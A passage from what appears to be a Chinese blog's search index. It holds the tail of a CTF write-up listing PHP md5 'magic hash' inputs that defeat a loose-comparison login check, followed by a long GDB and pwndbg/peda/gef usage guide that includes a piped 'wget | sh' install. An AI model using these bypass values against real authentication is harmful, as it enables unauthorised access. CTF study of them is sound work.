true。<br>只需两个有一个成立即可，找两个md5相等值即可：</p><p><code>($GET[&#39;user&#39;]===$GET[&#39;password&#39;])||(md5($GET[&#39;user&#39;])!=md5($GET[&#39;password&#39;]))</code></p><p><a href="https://blog.csdn.net/qq_29566629/article/details/108736519">https://blog.csdn.net/qq_29566629/article/details/108736519</a></p><p>这列记录几个：</p><pre><code>QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB使用总结</title>
      <link href="2021/10/11/gdb-shi-yong-zong-jie/"/>
      <url>2021/10/11/gdb-shi-yong-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>GDB: The GNU Project Debugger：<a href="http://www.gnu.org/software/gdb/documentation/">http://www.gnu.org/software/gdb/documentation/</a></p><p>参考：<a href="http://www.jianshu.com/p/30ffc01380a0">http://www.jianshu.com/p/30ffc01380a0</a></p><p>参考：<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-gdbmp/">https://www.ibm.com/developerworks/cn/linux/l-cn-gdbmp/</a></p><p>参考：<a href="http://wiki.ubuntu.org.cn/%E7%94%A8GDB%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F">http://wiki.ubuntu.org.cn/%E7%94%A8GDB%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F</a></p><p>参考：<a href="http://blog.csdn.net/21cnbao/article/details/7385161">http://blog.csdn.net/21cnbao/article/details/7385161</a></p><p>GDB 常用调试命令以及多进程多线程调试：<a href="https://blog.csdn.net/freeelinux/article/details/53700266">https://blog.csdn.net/freeelinux/article/details/53700266</a></p><p>Linux 下 GDB 用法基础教程详解：<a href="http://blog.csdn.net/cc198877/article/details/7767312">http://blog.csdn.net/cc198877/article/details/7767312</a></p><p>100 个 gdb 技巧：<a href="https://github.com/hellogcc/100-gdb-tips/blob/master/src/index.md">https://github.com/hellogcc/100-gdb-tips/blob/master/src/index.md</a></p><p>Hyperpwn：基于 gdb 的调试利器，让你的调试过程更轻松：<a href="https://bbs.pediy.com/thread-257344.htm">https://bbs.pediy.com/thread-257344.htm</a></p><pre><code>编译时必须添加  -g 才能利用 GDB进行调试，如：gcc -g test.c -o test  这样编译生成的可执行文件才可以利用gdb进行源码调试。-g 是在可执行文件中加入源代码的信息，比如可执行文件中第几条机器指令对应源代码的第几行，但并不是把整个源文件嵌入到可执行文件中，所以调试时必须保证 gdb 能找到源文件。如果把当前的 gdb.c 改名为 g.c 或者将 gdb.c 移动到其他地方，则 gdb 无法进行调试。-gProduce debugging information in the operating system’s native format.GDB can work with this debugging information.产生debug信息是操作系统默认格式。GDB可以使用这种格式。-ggdbProduce debugging information for use by GDB.产生debug信息给GDB使用的。-g3Request debugging information and also use level to specify how much information.The default level is 2.Level 0 produces no debug information at all.Thus -g0 negates -g.Level 3 includes extra information,such as all the macro definitions present in the program.Some debuggers support macro expansion when you use -g3.Level 1 produces minimal information,enough for making backtraces in parts of the program that you don’t plan to debug.This includes descriptions of functions and external variables,and line number tables,but no information about local variables.-g3 的 3表示级别，默认级别是2，级别0没有debug信息，级别3可以调试宏。-gstabs          此选项以stabs格式声称调试信息，但是不包括gdb调试信息。-gstabs+        此选项以stabs格式声称调试信息，并且包含仅供gdb使用的额外调试信息。</code></pre><p>GCC 参数详解：<a href="https://www.runoob.com/w3cnote/gcc-parameter-detail.html">https://www.runoob.com/w3cnote/gcc-parameter-detail.html</a></p><p>#一、linux 下 gdb 的安装方法</p><p>gdb 是 Linux 环境下的代码调试工具，其安装步骤如下：</p><pre><code>    step1：首先检查系统中有没有安装过，有的话用一下命令卸载 gdb旧版本    step2：在网址：http://ftp.gnu.org/gnu/gdb下载 gdb 源码包。           或者直接在linux系统中用wget命令下载：           wget http://ftp.gnu.org/gnu/gdb/gdb-8.0.1.tar.gz           会下载到当前目录下。将源码包放在 home 目录的 Download 目录中。    step3：打开Download目录，用tar -zxvf 命令解压缩你下载的源码包    step4：.用以下命令生成makefile文件            1. ./configure           2.make（这个需要的时间比较长，耐心等待哟~）           3.sudo make install           4.查看安装是否成功：gdb -v</code></pre><p>查看 core 文件</p><pre><code>产生core文件后，就可以利用命令gdb进行查找。切换到core文件所在的目录，输入命令：gdb ./test core-test-26795-1519971969参数一是应用程序的名称，参数二是core文件，展示错误内容，如下图所示：(gdb)后输入where，就会看到程序崩溃时堆栈信息（当前函数之前的所有已调用函数的列表（包括当前函数），gdb只显示最近几个）</code></pre><h2 id="gdb-插件-Peda、Pwndbg、Gef-的安装"><a href="#gdb-插件-Peda、Pwndbg、Gef-的安装" class="headerlink" title="gdb 插件 Peda、Pwndbg、Gef 的安装"></a>gdb 插件 Peda、Pwndbg、Gef 的安装</h2><p><a href="http://www.peckerwood.top/post/peda_vs_pwndbg_gdb/">http://www.peckerwood.top/post/peda_vs_pwndbg_gdb/</a></p><p>GDB的三个插件（gef gdbinit peda）超简单安装：<a href="https://blog.csdn.net/aoxixi/article/details/90142736">https://blog.csdn.net/aoxixi/article/details/90142736</a></p><p>gdb/pwndbg 常用命令简单整理：<a href="https://www.cnblogs.com/zhwer/p/12494317.html">https://www.cnblogs.com/zhwer/p/12494317.html</a></p><p>kali 下 gdb 安装 peda|pwndbg|gef 走过的坑：<a href="https://zhuanlan.zhihu.com/p/129837931">https://zhuanlan.zhihu.com/p/129837931</a></p><p>在调试时有时候需要不同功能，在gdb下需要安装两个工具 pwndbg 和 peda，可惜这两个不兼容</p><p>pwndbg 在调试堆的数据结构时候很方便。peda 在查找字符串等功能时方便</p><p>安装 pwndbg：</p><pre><code>git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh</code></pre><p>安装 peda：</p><p>git clone <a href="https://github.com/longld/peda.git">https://github.com/longld/peda.git</a> ~/peda</p><p>安装 gef：</p><pre><code># via the install script$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh# manually$ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py$ echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</code></pre><p>切换 gdb 的调试工具 pwndbg 或 peda：</p><pre><code>vim ~/.gdbinitsource ~/peda/peda.py</code></pre><p>把第二行添加到 gdbinit 的配置文件中去，把 pwndbg 的注释掉，即可切换为 peda</p><p>选中 gef 的话，即添加一行：source ~/.gdbinit-gef.pysource ~/.gdbinit-gef.py</p><h1 id="二、gdb-的-图形化GUI"><a href="#二、gdb-的-图形化GUI" class="headerlink" title="二、gdb 的 图形化GUI"></a>二、gdb 的 图形化GUI</h1><h2 id="gdb-的-图形化"><a href="#gdb-的-图形化" class="headerlink" title="gdb 的 图形化"></a>gdb 的 图形化</h2><p>关键字：gdb前端 vim</p><p>优秀的 gdb 图形化前端调试器：<a href="https://blog.csdn.net/weixin_34242331/article/details/85905052">https://blog.csdn.net/weixin_34242331/article/details/85905052</a></p><p>vi/vim使用进阶: 在VIM中使用GDB调试 – 使用vimgdb：<a href="https://www.cnblogs.com/snowbook/p/5920637.html">https://www.cnblogs.com/snowbook/p/5920637.html</a></p><p>gdb前端: VIM+Pyclewn 调试C/C++：<a href="https://www.cnblogs.com/wucg/p/4095574.html">https://www.cnblogs.com/wucg/p/4095574.html</a></p><h2 id="gdb-的-文本界面"><a href="#gdb-的-文本界面" class="headerlink" title="gdb 的 文本界面"></a>gdb 的 文本界面</h2><p>gdb Text User Interface(TUI) GDB 文本用户界面</p><pre><code>(1) 打开TUI模式    方法一: 使用‘gdbtui’ or ‘gdb-tui’开始一个调试            $ gdbtui -q sample            (gdb) ....    方法二: 使用切换键 `ctrl+x ctrl+a` or `ctrl+x A` 或者 gdb模式下输入命令：（gdb）layout(2) TUI模式下有4个窗口,    command 命令窗口. 可以键入调试命令    source 源代码窗口. 显示当前行,断点等信息    assembly 汇编代码窗口    register 寄存器窗口    除command 窗口外,其他三个窗口不可同时显示.其可用 layout 命令来进行选择    自己需要的窗口. 可参见 `help layout` .(3) 设置TUI    set tui border-kind kind    Select the border appearance for the source, assembly and register windows.    The possible values are the following:    space: Use a space character to draw the border.    ascii: Use ascii characters ‘+’, ‘-’ and ‘|’ to draw the border.    acs Use the Alternate Character Set to draw the border. The     border is    drawn: using character line graphics if the terminal supports them.(4) 更详尽的说明    http://sourceware.org/gdb/current/onlinedocs/gdb_23.html#SEC235.另：   ctrl+x再ctrl+a： 在classic和layout两种方式之间切换gdb的显示方式。   (layout方式的gdb很有用，但是layout方式的gdb有bug，你会用到这种快速切换的)</code></pre><h2 id="gdb帮助"><a href="#gdb帮助" class="headerlink" title="gdb帮助"></a>gdb帮助</h2><p>gdb 提供一个类似 Shell 的命令行环境，下面的 (gdb) 就是提示符，在这个提示符下输入help可以查看命令的类别。<br>使用 help 类别（比如 help data）可以进一步查看 data 类别下的命令帮助。</p><p>(gdb) help<br>下面列出了命令分类（对每个命令都可以使用：help 命令 获取帮助。例如：help info）:</p><pre><code>aliases -- Aliases of other commandsbreakpoints -- Making program stop at certain pointsdata -- Examining datafiles -- Specifying and examining filesinternals -- Maintenance commandsobscure -- Obscure featuresrunning -- Running the programstack -- Examining the stackstatus -- Status inquiriessupport -- Support facilitiestracepoints -- Tracing of program execution without stopping the programuser-defined -- User-defined commandsType &quot;help&quot; followed by a class name for a list of commands in that class.Type &quot;help all&quot; for the list of all commands.Type &quot;help&quot; followed by command name for full documentation.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.Command name abbreviations are allowed if unambiguous.(gdb) help info</code></pre><h2 id="使用-gdb-进行调试"><a href="#使用-gdb-进行调试" class="headerlink" title="使用 gdb 进行调试"></a>使用 gdb 进行调试</h2><pre><code>1. 启动    gdb 应用程序名    gdb 应用程序名 core文件名    gdb 应用程序名 pid                 gdb 应用程序名 --args 应用程序的运行参数    //这个是在进入gdb 之前设置参数，也可以在进入gdb后设置参数。帮助:    help    显示帮助    info    显示程序状态    set     修改    show    显示gdb状态运行及运行环境设置:    set args                #   设置运行参数    show args               #   显示运行参数    set env 变量名 = 值     #   设置环境变量    unset env [变量名]      #   取消环境变量    show env [变量名]       #   显示环境变量    path 目录名             #   把目录添加到查找路径中    show paths              #   显示当前查找路径    cd 目录                 #   切换工作目录    pwd                     #   显示当前工作目录    tty /dev/pts/1              #   修改程序的输入输出到指定的tty    set inferior-tty /dev/pts/1 #   修改程序的输出到指定的tty    show inferior-tty    show tty    run 参数         #   运行    start 参数       #   开始运行，但是会在main函数停止    attach pid    detach    kill             #   退出    Ctrl-C           #   中断(SIGINT)    Ctrl-]线程操作:    info threads       #   查看所有线程信息    thread 线程id      #   切换到指定线程    thread apply [threadno | all ] 参数     #   对所有线程都应用某个命令子进程调试:    set follow-fork-mode child|parent   #   fork后，需要跟踪谁    show follow-fork-mode    set detach-on-flow on|off           #   fork后，需要两个都跟踪吗    info forks                          #   显示所有进程信息    fork 进程id                         #   切换到某个进程    detach-fork 进程id                  #   不再跟踪某个进程    delete fork 进程id                  #   kill某个进程并停止对它的跟踪调试子进程    方法一:        GDB对使用fork/vfork创建子进程的程序提供了follow-fork-mode选项来支持多进程调试。        set follow-fork-mode [parent|child]        * parent: fork之后继续调试父进程，子进程不受影响。        * child: fork之后调试子进程，父进程不受影响        (gdb) set follow-fork-mode child        (gdb) break 子进程行号    方法二:        使用GDB的attach命令.        attach命令可以绑定一个外部程序进行调试(可参考(gdb) help attach).        假设调试名为test_proc进程的子进程.先使用        $ ps -ef | grep test_proc        找出其子进程的PID号.然后        (gdb) attach &lt;子进程的PID&gt;        进行调试.之后,用detach命令终止调试.    可以把follow-fork-mode和attach混合使用,用来调试正在运行的程序的子进程.使用 GDB 调试多进程程序：http://www.ibm.com/developerworks/cn/linux/l-cn-gdbmp/线程断点:    break 行号信息 thread 线程号 [if 条件] #   只在某个线程内加断点线程调度锁:    set scheduler-locking on|off    #   off时所有线程都可以得到调度,on时只有当前    show scheduler-locking调用链:    backtrace(bt)   [n|-n|full] #  显示当前调用链,n限制显示的数目,-n表示显示后n个,n表示显示前n个，               #  full的话还会显示变量信息，使用 thread apply all bt 就可以显示所有线程的调用信息    set backtrace past-main on|off     show backtrace past-main     set backtrace past-entry on|off     show backtrace past-entry    set backtrace limit n           #   限制调用信息的显示层数    show backtrace limit检查点:     checkpoint/restart查看停止原因:    info program</code></pre><h2 id="用-gdb-查看、执行汇编代码"><a href="#用-gdb-查看、执行汇编代码" class="headerlink" title="用 gdb 查看、执行汇编代码"></a>用 gdb 查看、执行汇编代码</h2><p><a href="https://blog.csdn.net/hejinjing_tom_com/article/details/26704487">https://blog.csdn.net/hejinjing_tom_com/article/details/26704487</a><br>gdb调试汇编指令和查看寄存器：<a href="https://www.linuxidc.com/linux/2014-10/108574.htm">https://www.linuxidc.com/linux/2014-10/108574.htm</a></p><h1 id="三、gdb-常用操作"><a href="#三、gdb-常用操作" class="headerlink" title="三、gdb 常用操作"></a>三、gdb 常用操作</h1><pre><code>gdb -tui test     打开调试程序，界面分页，上面是代码，下面是命令。或者 gdbtui test                  gdbtui 的开关快捷键： ctrl+x ctrl+a 或者 ctrl+x Afile test         在运行gdb下打开test文件回车键            直接敲击回车键表示执行 上一条 命令。run/r             运行程序continue/c        继续运行。当程序被停住后，可以使用continue命令（缩写c，fg命令同continue命令）,                  恢复程序的运行直到程序结束，或到达下一个断点。命令中可以给出一个数字N，忽略其后N-1次断点      step/s            单步进入。如果有函数则进入函数执行。　step [N]          如果遇到函数调用，并且该函数编译时有调试信息，则会进入该函数内执行。stepi             继续执行程序下一行源代码中的汇编指令。                  如果是函数调用，这个命令将进入函数的内部，单步执行函数中的汇编代码。next/n            单步执行。next [N]          遇到函数调用时，执行整个函数。nexti             执行下一行的源代码中的一条汇编指令until/c xxx       运行至当前语句块结束。可用于跳出循环。print/p               显示变量的值ptype                 显示变量的类型。即 print typewhatis varName        查看变量varName的类型finish                继续执行，至到当前函数返回，然后停下来等待命令。即 跳出当前的函数。return &lt;expression&gt;   如果在函数中设置了调试断点，在断点后还有语句没有执行完，                      可以使用return命令强制函数忽略还没有执行的语句并返回。                       如果指定了&lt;expression&gt;，那么该表达式的值会被作为函数的返回值。start             用start命令开始执行程序stop              停止运行kill              终止当前debug的进程guit/ctrl+d       退出GDBprint命令是查看运行时的数据    print/p   var          打印变量var的值    set                    设置变量的值。例如：set nval=54 将把54保存到nval变量中    print/p   &amp;var         打印变量var的地址（存放变量 var 的地址）    printf/p  *addr        打印地址的值    printf/p /x var        用16进制显示数据。                            x代表十六进制。d代表十进制。u代表十六进制无符号。t代表二进制。c代表字符。f代表浮点    print   array@5        显示从array（数组名）开始的5个值    print   array[2]@3     显示从array第二个元素开始的3个数组元素的值    whatis  i              显示变量i的数据类型    p file::variable       查看文件作用域变量    p function::variable   查看函数作用域变量    print &lt;expr&gt;     //expr可是变量名，表达式                     &lt;expr&gt;是表达式，是被调试的程序中的表达式，&lt;f&gt;是输出的格式，                     比如，如果要把表达式按16进制的格式输出，那么就是/x。                     在表达式中，有几种GDB所支持的操作符，它们可以用在任何一种语言中，                    “@”是一个和数组有关的操作符，                    “::”指定一个在文件或是函数中的变量，                    “&#123;&lt;type&gt;&#125; &lt;addr&gt;”表示一个指向内存地址&lt;addr&gt;的类型为type的一个对象。    ------------------------------------------------------    查看数据:        ptype   表达式      #   查看某个表达式的类型        print [/f] [表达式] #   按格式查看表达式内容,/f是格式化        set print address on|off   #   打印时是不是显示地址信息        show print address        set print symbol-filename on|off # 是不是显示符号所在文件等信息        show print symbol-filename        set print array on | off    #   是不是打印数组        show print array        set print array index   on | off    #   是不是打印下标        show print array index        ...        表达式可以用下面的修饰符:            var@n           #   表示把var当成长度为n的数组            filename::var   #   表示打印某个函数内的变量,filename可以换成其它范围符如文件名            &#123;type&#125; var      #   表示把var当成type类型        输出格式:            x               #   16进制            d               #   10进制            u               #   无符号            o               #   8进制            t               #   2进制            a               #   地址            c               #   字符            f               #   浮点断点（使用 break 命令设置断点）                                            break/b n                 在 当前文件 第n行 打断点 。例如： b 10    break/b func              在 当前文件 函数func 的入口处设置断点。例如：b main    break *address            在程序运行的内存地址处停住。    break/b 30 if n==100      当变量n等于100的时候在30行处加断点                              break ... if 条件成立时停住。例如: break 337 if i==0    break fileName:N            在文件名为fileName的文件的第N行加断点。  例如： b test.cpp:10    break filename:linenum      在源文件filename的linenum行处停住。例如 b test.cpp:main    break filename:function     在源文件filename的function函数的入口处停住。    info break/breakpoints/b  查看断点    info b[n]                 列出所有断点信息(info breakpoints/break/watchpoints  [num])    clear N                   删除N行断点    delete N                  删除N号断点    delete                    删除所有断点 (d : 删除所有断点。后面可给出断点号码，多个断点用空格分开)    disable xxx               禁止断点功能，禁用多个则用空格分开。这个命令需要禁止的断点在断点列表索引值作为参数    enable xxx                激活被停用的断点，各断点号码用空格分开，这个命令需要允许的断点在断点列表索引值作为参数    display                   在断点的停止的地方，显示指定的表达式的值。（显示变量）    ignore                    忽略某个断点制定的次数。例：ignore 4 23 忽略断点4的23次运行，在第24次的时候中断    --------------------------------------------------------------------------------------------------------    断点(breakpoint):   程序运行到某处就会中断        break(b)    行号|函数名|程序地址 | +/-offset | filenam:func   [if 条件]   #   在指定位置设置断点        tbreak      ...           #   与break相似，只是设置一次断点        hbreak      ...           #   与break相似，只是设置硬件断点，需要硬件支持        thbreak     ...           #   与break相似，只是设置一次性硬件断点，需要硬件支持        rbreak      正则表达式    #   给一批满足条件的函数打上断点        info break [断点号]       #   查看某个断点或所有断点信息        set breadpoint pending auto|on|off    #   查看如果断点位置没有找到时行为        show breakpoint pending    观察点(watchpoint): 表达式的值修改时会被中断        watch   表达式          #   当表达式被写入，并且值被改变时中断        rwatch 表达式           #   当表达式被读时中断        awatch 表达式           #   当表达式被读或写时中断        info watchpoints            set can-use-hw-watchpoints 值      #   设置使用的硬件观察点的数        show can-use-hw-watchpoints         rwatch与awatch需要有硬件支持，另外如果是对局部变量使用watchpoint，那退出作用域时观察点会自动被删除        另外在多线程情况下，gdb的watchpoint只对一个线程有效    捕获点(catchpoint): 程序发生某个事件时停止，如产生异常时        catch   事件名        事件包括:                throw                    #   产生c++异常                catch                    #   捕获到c++异常                exec/fork/vfork          #   一个exec/fork/vfork函数调用,只对HP-UX                load/unload    [库名]    #   加载/卸载共享库事件，对只HP-UX        tcatch 事件名                    #   一次性catch        info    break    断点操作:        clear   [函数名|行号]    #   删除断点，无参数表示删除当前位置        delete  [断点号]         #   删除断点，无参数表示删所有断点        disable [断点号]        enable  [断点号]        condition   断点号 条件     #   增加断点条件        condition   断点号          #   删除断点条件        ignore      断点号 数目     #   忽略断点n次         commands    断点号          #   当某个断点中断时打印条件            条件        end        下面是一个例子,可以一直打印当前的X值：        commands    3            printf &quot;X:%d\n&quot;,x            cont        end    断点后操作:        continue(c) [忽略次数] #   继续执行，[忽略前面n次中断]        fg          [忽略次数] #   继续执行，[忽略前面n次中断]        step(s)     [n步]       #   步进,重复n次        next(n)     [n步]       #   前进,重复n次        finish                  #   完成当前函数调用，一直执行到返回处，并打印返回值        until(u)    [位置]      #   一直执行到当前行或指定位置，或是当前函数返回        advance     位置        #   前面到指定位置，如果当前函数返回则停止,与until类似        stepi(si)   [n步]       #   精确的只执行一个汇编指令,重复n次        nexti(ni)   [n步]       #   精确的只执行一个汇编指令,碰到函数跳过,重复n次        set step-mode   on|off #   on时,如果函数没有调试信息也跟进        show step-modeinfo（或i） locals    查看当前栈帧局部变量的值info line       [行号][函数名][文件名:行号][文件名:函数名]info display    查看设置的需要显示的表达式的信息info source     查看当前程序info stack      查看堆栈信息info args       查看当前参数值display args    查看当前参数值自动显示的变量值的相关命令。已经设置后的变量，当每执行一个调试命令后会自动显示在调试界面中。display &lt;expr&gt;               设置要自动显示值的变量display /&lt;fmt&gt; &lt;expr&gt;        设置要自动显示的变量及数据的显示格式undisplay  display &lt;dnum&gt;    删除一个自动显示变量delete display &lt;dnum&gt;        删除一个自动显示变量undisplay/delete display &lt;dnum1~dnum5&gt;     删除一个范围内的自动变量disable/enable display &lt;dnum&gt;              禁用/启用一个自动显示变量info display                               查看设置的自动显示变量pwd        查看程序路径ctrl+p     前一条命令ctrl+n     下一条命令watch xxx  设置监控点，在变量改变的时候停下来。（不可直接设置，先加断点在监测）ctrl+l    可能layout会造成控制台花屏,使用ctrl+L清屏使用 list命令 显示源文件：    list（或l）    列出源代码，如果没有提供参数给这个命令，则接着上次的位置往下列，默认每次列10行    list 行号    列出从第几行开始的源代码    list 函数名    从函数开头列出显示某个函数的源代码    list linenum          以linenum指定的行号为中心，显示10行    list function         以指定的函数为中心，显示10行    list +                以上次显示的结束行为起始行显示后10行    list -                以上次显示的起始行为结束行，显示前10行    list first,last       显示first行与last行之间的代码    list ,last            显示当前行到last行之间的代码    list first,           以first为第一行，显示10行    set listsize count    设置每次显示的行数。    show listsize         显示已设置的显示行数。    -------------------------------------------------------------------        显示行号:        list(l) [行号|函数|文件:行号]   #   显示指定位置的信息,无参数为当前位置        list    -                       #   显示当前行之前的信息        list    first,last              #   从frist显示到last行        list    ,last                   #   从当前行显示到last行        list    frist,                  #   从指定行显示        list    +                       #   显示上次list后显示的内容        list    -                       #   显示上次list前面的内容        在上面，first和last可以是下面类型:            行号            +偏移            -偏移            文件名:行号            函数名            函数名:行号        查看栈信息    栈的定义：栈是一种特殊的表这种表只在表头进行插入和删除操作。              因此，表头对于栈来说具有特殊的意义，称为栈顶。相应地，表尾称为栈底。不含任何元素的栈称为空栈。              任何时候，出栈的元素都是栈顶元素。换句话说，栈的修改是按后进先出的原则进行的.              因此，栈又称为后进先出(Last In First Out)表，简称为LIFO表。              所以，只要问题满足LIFO原则，就可以使用栈backtrace/bt    打印当前的函数调用栈的所有信息。查看函数堆栈（函数各级调用信息）如：(gdb) bt#0  func (n=250) at tst.c:6#1  0x08048524 in main (argc=1, argv=0xbffff674) at tst.c:30#2  0x400409ed in __libc_start_main () from /lib/libc.so.6从上可以看出函数的调用栈信息：__libc_start_main --&gt; main() --&gt; func()backtrace &lt;n&gt;bt &lt;n&gt;             n是一个正整数，表示只打印栈顶上n层的栈信息。backtrace &lt;-n&gt;bt &lt;-n&gt;            -n表一个负整数，表示只打印栈底下n层的栈信息。如果你要查看某一层的信息，你需要切换当前栈，一般来说，程序停止时，最顶层的栈就是当前栈，如果你要查看栈下面层的详细信息，首先要做的是切换当前栈。切换栈使用 frame 命令帧 frame:    frame &lt;n&gt;    f &lt;n&gt;        n是一个从0开始的整数，是栈中的层编号。比如：frame 0，表示栈顶，frame 1，表示栈的第二层。    frame(f) [帧编号]       #   不带参数时显示所有帧信息，带参数时切换到指定帧。即 选择指定栈帧    frame    地址           #   切换到指定地址的帧    up       [n]            #   表示向栈的上面移动n层，可以不打n，表示向上移动一层。    down     [n]            #   表示向栈的下面移动n层，可以不打n，表示向下移动一层。    上面的命令，都会打印出移动到的栈层的信息。如果你不想让其打出信息。你可以使用这三个命令：    select-frame   帧号     #   切换到指定帧并且不打印被转换到的帧的信息。对应于 frame 命令。    up-silently    [n]      #   向上n帧,不显示帧信息。对应于 up 命令。    down-silently  [n]      #   向下n帧,不显示帧信息。对应于 down 命令。查看当前栈层的信息，你可以用以下GDB命令：    frame 或 f    会打印出这些信息：栈的层编号，当前的函数名，函数参数值，函数所在文件及行号，函数执行到的语句。显示帧信息:    info    frame       #   显示当前帧信息。或者 info f                            这个命令会打印出更为详细的当前栈层的信息，只不过，大多数都是运行时的内存地址。                            比如：函数地址，调用函数的地址，被调用函数的地址，目前的函数是由什么样的程序语言写成的、                            函数参数地址及值、局部变量的地址等等。    info    frame addr  #   显示指定地址的帧信息    info    args        #   显示帧的参数    info    locals      #   显示局部变量信息    info    catch       #   显示本帧异常信息jump命令一般来说，被调试程序会按照程序代码的运行顺序依次执行，但是GDB也提供了乱序执行的功能。也就是说，GDB可以修改程序的执行顺序，从而让程序随意跳跃。这个功能可以由GDB的jump命令：jump &lt;linespec&gt; 来指定下一条语句的运行点。&lt;linespec&gt;可以是文件的行号，可以是file:line格式，也可以是+num这种偏移量格式，表示下一条运行语句从哪里开始。jump &lt;address&gt; 这里的&lt;address&gt;是代码行的内存地址。 注意，jump命令不会改变当前的程序栈中的内容，所以，如果使用jump从一个函数跳转到另一个函数，当跳转到的函数运行完返回，进行出栈操作时必然会发生错误，这可能导致意想不到的结果，所以最好只用jump在同一个函数中进行跳转。1、程序运行参数。    set args 可指定运行时参数。（如：set args -f 20 -t 40）    show args 命令可以查看设置好的运行参数。2、运行环境。    path 可设定程序的运行路径。    show paths 查看程序的运行路径。    set environment varname [=value] 设置环境变量。如：set env USER=user    show environment [varname] 查看环境变量。3、工作目录。    cd 相当于shell的cd命令。    pwd 显示当前的所在目录。4、程序的输入输出。    info terminal 显示你程序用到的终端的模式。    使用重定向控制程序输出。如：run &gt; outfile    tty命令可以指写输入输出的终端设备。如：tty /dev/ttyb设置观察点（WatchPoint）    watch 一量表达式值有变化时，马上停住程序。    rwatch 当表达式（变量）expr被读时，停住程序。    awatch 当表达式（变量）的值被读或被写时，停住程序。    info watchpoints 列出当前所设置了的所有观察点。为停止点设定运行命令(很实用的强大的功能.)    commands [bnum]    ... command-list ...    end    为断点号bnum指写一个命令列表。当程序被该断点停住时，gdb会依次运行命令列表中的命令。停止条件维护    condition 修改断点号为bnum的停止条件为expression。    condition 清除断点号为bnum的停止条件。信号:    signal 命令    使用 singal 命令，可以产生一个信号量给被调试的程序，如中断信号“Ctrl+C”。    这非常方便于程序的调试，可以在程序运行的任意位置设置断点，并在该断点用GDB产生一个信号量，    这种精确地在某处产生信号的方法非常有利于程序的调试。     signal 命令 的 语法是：signal &lt;signal&gt;，UNIX的系统信号量通常从1到15，所以&lt;signal&gt;取值也在这个范围。    info signals            #   列出所有信号的处理方式    info handle             #   同上    handle 信号    方式    #   改变当前处理某个信号的方式    方式包括:                    nostop #   当信号发生时不停止，只打印信号曾经发生过                    stop    #   停止并打印信号                    print   #   信号发生时打印                    noprint #   信号发生时不打印                    pass/noignore # gdb充许应用程序看到这个信号                    nopass/ignore # gdb不充许应用程序看到这个信号编辑:    edit    [行号|函数|函数名:行号|文件名:函数名] # 编辑指定位置查找:    search          表示式      #   向前查找表达式    reverse-search 表示式       #   向后查找表达式指定源码目录:    directory(dir) [目录名]     #   指定源文件查找目录    show directories源码与机器码：    info line [函数名|行号]     #   显示指定位置对应的机器码地址范围    disassemble [函数名 | 起始地址 结束地址]    #   对指定范围进行反汇编    set disassembly-flavor att|intel            #   指定汇编代码形式    show disassembly-flavor    查看内存:    examine命令（缩写为x）来查看内存地址中的值。    examine命令的语法：x/&lt;n/f/u&gt; &lt;addr&gt;          &lt;addr&gt; 表示一个内存地址。“x/”后的n、f、u都是可选的参数。         n 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容；         f 表示显示的格式，如果地址所指的是字符串，那么格式可以是s，如果地址是指令地址，那么格式可以是i；         u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4字节。         u 参数可以被一些字符代替：b表示单字节，h表示双字节，w表示四字节，g表示八字节。         当我们指定了字节长度后，GDB会从指定的内存地址开始，读写指定字节，并把其当作一个值取出来。         n、f、u 这3个参数可以一起使用，      例如命令“x/3uh 0x54320”表示从内存地址0x54320开始以双字节为1个单位（h）、16进制方式（u）显示3个单位（3）的内存。    x   /nfu    地址    #   查看内存        n       重复n次        f       显示格式,为print使用的格式        u       每个单元的大小,为                b       byte                h       2 byte                w       4 byte                g       8 byte自动显示:    display [/fmt] 表达式 #   每次停止时都会显示表达式,fmt与print的格式一样,如果是内存地址，那fmt可像 x的参数一样    undisplay   显示编号    delete display 显示编号    #   这两个都是删附某个显示    disable display 显示编号    #   禁止某个显示    enable display 显示编号     #   重显示    display                     #   显示当前显示内容    info display                #   查看所有display项查看变量历史：    show values 变量名 [n]     #   显示变量的上次显示历史,显示n条    show values 变量名 +       #   继续上次显示内容便利变量:   (声明变量的别名以方便使用)    set $foo    = *object_ptr   #   声明foo为object_ptr的便利变量    init-if-undefined $var = expression #   如果var还未定义则赋值    show convenience内部便利变量：    $_      上次x查看的地址    $__    $_exitcode 程序垢退出码寄存器:    into registers      #   除了浮点寄存器外所有寄存器    info all-registers #   所有寄存器    into registers 寄存器名     #   指定寄存器内容    info float          #   查看浮点寄存器状态    info vector         #   查看向量寄存器状态    gdb为一些内部寄存器定义了名字，如$pc(指令),$sp(栈指针),$fp(栈帧),$ps(程序状态)    p /x $pc    #   查看pc寄存器当前值    x /i $pc    #   查看要执行的下一条指令    set $sp += 4 # 移动栈指针内核中信息:    info udot       #   查看内核中user struct信息    info auxv       #   显示auxv内容(auxv是协助程序启动的环境变量的)内存区域限制:    mem 起始地址 结构地址 属性  #   对[地始地址,结构地址)区域内存进行保护，如果结构地址为0表示地址最大值0xffffffff    delete mem 编号             #   删除一个内存保护    disable mem 编号            #   禁止一个内存保护    enable mem 编号             #   打开一个内存保护    info mem                    #   显示所有内存保护信息    保护的属性包括：        1. 内存访问模式:   ro | wo |rw        2. 内存访问大小:   8 | 16 | 32 | 64    如果不限制，表示可按任意大小访问        3. 数据缓存:       cache | nocache     cache表示充许gdb缓存目标内存内存复制到/从文件:    dump [格式] memory 文件名 起始地址 结构地址 #   把指定内存段写到文件    dump [格式] value 文件名 表达式             #   把指定值写到文件        格式包括:            binary      原始二进制格式            ihex        intel 16进制格式            srec        S-recored格式            tekhex      tektronix 16进制格式    append [binary] memory 文件名 起始地址 结构地址 #   按2进制追加到文件    append [binary] value 文件名 表达式             #   